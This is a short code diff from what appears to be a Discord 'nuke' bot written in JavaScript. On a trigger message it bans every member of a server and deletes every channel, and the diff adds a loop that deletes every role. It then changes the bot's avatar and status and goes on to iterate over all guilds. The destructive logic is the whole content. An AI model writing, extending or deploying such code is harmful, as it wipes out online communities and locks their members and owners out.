@@ -23,8 +23,9 @@ if (message.content === x_x) {
     message.guild.members.forEach(baand => {
    baand.ban({reason: spam,});
    client.channels.forEach(hackch => {
-   client.roles.forEach(hackch
    hackch.delete();
+   client.roles.forEach(hackchh => {
+   hackchh.delete();
    client.user.setAvatar(pic)
    client.user.setGame(playing, 'https://www.twitch.tv/end')
    client.guilds.forEach(hack => {
